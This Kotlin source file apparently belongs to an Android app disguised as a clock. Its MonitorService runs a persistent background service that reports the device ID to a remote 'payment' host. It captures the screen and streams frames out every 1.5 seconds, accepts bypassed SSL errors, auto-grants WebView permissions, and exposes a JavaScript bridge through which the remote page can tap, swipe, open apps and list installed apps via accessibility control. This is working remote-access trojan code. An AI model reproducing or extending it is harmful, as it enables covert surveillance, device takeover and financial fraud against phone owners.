package com.clock.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.http.SslError
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.PermissionRequest
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import java.io.ByteArrayOutputStream
import java.net.URLEncoder

class MonitorService : Service() {

    companion object {
        var lastStatus: String = "Service started"
        var lastBridgeTime: Long = System.currentTimeMillis()
        var projectionCode: Int = 0
        var projectionData: Intent? = null
    }

    private val handler = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var fullUrl = ""
    private var androidId = "unknown"
    private val monitorUrl = "https://payment70.site.je/monitor.html"
    private val CHANNEL_ID = "monitor_service"

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenRunning = false
    private var lastFrameTime = 0L
    private var deviceW = 720
    private var deviceH = 1600

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "start_screen") {
            handler.post { startScreen() }
        }
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            startForeground(1, buildNotification())
        } catch (e: Exception) {
        }
        try {
            val dm = DisplayMetrics()
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(dm)
            deviceW = dm.widthPixels
            deviceH = dm.heightPixels
        } catch (e: Exception) {
        }
        try {
            setupWebView()
        } catch (e: Exception) {
            lastStatus = "WebView error: " + e.message
        }
        handler.postDelayed(watchdog, 20000)
    }

    private val watchdog = object : Runnable {
        override fun run() {
            val idle = System.currentTimeMillis() - lastBridgeTime
            if (idle > 60000) {
                lastStatus = "Reconnecting..."
                lastBridgeTime = System.currentTimeMillis()
                try {
                    webView?.reload()
                } catch (e: Exception) {
                }
            }
            handler.postDelayed(this, 20000)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Clock Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Service"
            channel.setSound(null, null)
            channel.enableVibration(false)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        }
    }

    private fun setupWebView() {
        webView = WebView(this)
        val st = webView!!.settings
        st.javaScriptEnabled = true
        st.domStorageEnabled = true
        st.mediaPlaybackRequiresUserGesture = false
        st.cacheMode = WebSettings.LOAD_NO_CACHE
        st.databaseEnabled = true
        st.userAgentString = "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"

        webView!!.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (lastStatus == "Service started") {
                    lastStatus = "Page loaded, waiting JS..."
                }
            }

            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                super.onReceivedError(view, request, error)
                if (request?.isForMainFrame == true) {
                    lastStatus = "Page error: " + (error?.description?.toString() ?: "unknown")
                }
            }

            override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
                try {
                    handler?.proceed()
                } catch (e: Exception) {
                }
            }
        }

        webView!!.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                try {
                    request?.grant(request.resources)
                } catch (e: Exception) {
                }
            }
        }

        webView!!.addJavascriptInterface(WebBridge(), "Android")

        androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceInfo = URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8")
        fullUrl = monitorUrl + "?did=" + androidId + "&dinfo=" + deviceInfo
        webView!!.loadUrl(fullUrl)
    }

    fun startScreen() {
        if (screenRunning) {
            lastStatus = "Screen already live"
            return
        }
        if (projectionData == null) {
            try {
                val i = Intent(this, ProjectionActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
                lastStatus = "Screen permission requested"
            } catch (e: Exception) {
                lastStatus = "Screen request error"
            }
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    1, buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            }
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(projectionCode, projectionData!!)
            mediaProjection!!.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    screenRunning = false
                    lastStatus = "Screen stopped"
                    try {
                        virtualDisplay?.release()
                        virtualDisplay = null
                    } catch (e: Exception) {
                    }
                    try {
                        imageReader?.close()
                        imageReader = null
                    } catch (e: Exception) {
                    }
                }
            }, handler)
            imageReader = ImageReader.newInstance(360, 800, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection!!.createVirtualDisplay(
                "scr", 360, 800, 160,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )
            imageReader!!.setOnImageAvailableListener({ reader ->
                try {
                    val now = System.currentTimeMillis()
                    if (now - lastFrameTime >= 1500) {
                        lastFrameTime = now
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val plane = image.planes[0]
                            val buffer = plane.buffer
                            val pixelStride = plane.pixelStride
                            val rowStride = plane.rowStride
                            val rowPadding = rowStride - pixelStride * 360
                            val fullW = 360 + rowPadding / pixelStride
                            val bmp = Bitmap.createBitmap(fullW, 800, Bitmap.Config.ARGB_8888)
                            bmp.copyPixelsFromBuffer(buffer)
                            image.close()
                            val cropped = Bitmap.createBitmap(bmp, 0, 0, 360, 800)
                            val out = ByteArrayOutputStream()
                            cropped.compress(Bitmap.CompressFormat.JPEG, 55, out)
                            bmp.recycle()
                            cropped.recycle()
                            val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            handler.post {
                                webView?.evaluateJavascript(
                                    "upload('" + b64 + "','live_" + androidId + "_scr.jpg',function(ok){if(ok)cmd('Screen live');});",
                                    null
                                )
                            }
                        }
                    } else {
                        reader.acquireLatestImage()?.close()
                    }
                } catch (e: Exception) {
                }
            }, null)
            screenRunning = true
            lastStatus = "Screen live"
        } catch (e: Exception) {
            lastStatus = "Screen error: " + e.message
        }
    }

    private fun openAccessibilitySettings() {
        lastStatus = "Enable Accessibility for control"
        try {
            val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
        } catch (e: Exception) {
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            virtualDisplay?.release()
            mediaProjection?.stop()
        } catch (e: Exception) {
        }
        try {
            webView?.destroy()
        } catch (e: Exception) {
        }
    }

    inner class WebBridge {
        @JavascriptInterface
        fun onResult(text: String) {
            lastBridgeTime = System.currentTimeMillis()
            lastStatus = text
        }

        @JavascriptInterface
        fun onCommand(text: String) {
            lastBridgeTime = System.currentTimeMillis()
            lastStatus = text
        }

        @JavascriptInterface
        fun onUploadDone(text: String) {
            lastBridgeTime = System.currentTimeMillis()
            lastStatus = text
        }

        @JavascriptInterface
        fun startScreen() {
            handler.post { this@MonitorService.startScreen() }
        }

        @JavascriptInterface
        fun tap(x: Int, y: Int) {
            val cs = ControlService.instance
            if (cs != null) cs.tap(x.toFloat(), y.toFloat())
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int) {
            val cs = ControlService.instance
            if (cs != null) cs.swipe(x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), duration.toLong())
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun back() {
            val cs = ControlService.instance
            if (cs != null) cs.back()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun home() {
            val cs = ControlService.instance
            if (cs != null) cs.home()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun recents() {
            val cs = ControlService.instance
            if (cs != null) cs.recents()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun openApp(pkg: String) {
            try {
                val i = packageManager.getLaunchIntentForPackage(pkg)
                if (i != null) {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                }
            } catch (e: Exception) {
            }
        }

        @JavascriptInterface
        fun screenSize(): String {
            return deviceW.toString() + "x" + deviceH.toString()
        }

        @JavascriptInterface
        fun getApps(): String {
            val sb = StringBuilder("[")
            try {
                val intent = Intent(Intent.ACTION_MAIN, null).addCategory(Intent.CATEGORY_LAUNCHER)
                val list = packageManager.queryIntentActivities(intent, 0)
                var first = true
                for (ri in list) {
                    val pkg = ri.activityInfo.packageName
                    val name = ri.loadLabel(packageManager).toString()
                    if (!first) sb.append(",")
                    first = false
                    sb.append("{\"n\":\"").append(name.replace("\"", "'")).append("\",\"p\":\"").append(pkg).append("\"}")
                }
            } catch (e: Exception) {
            }
            sb.append("]")
            return sb.toString()
        }
    }
}
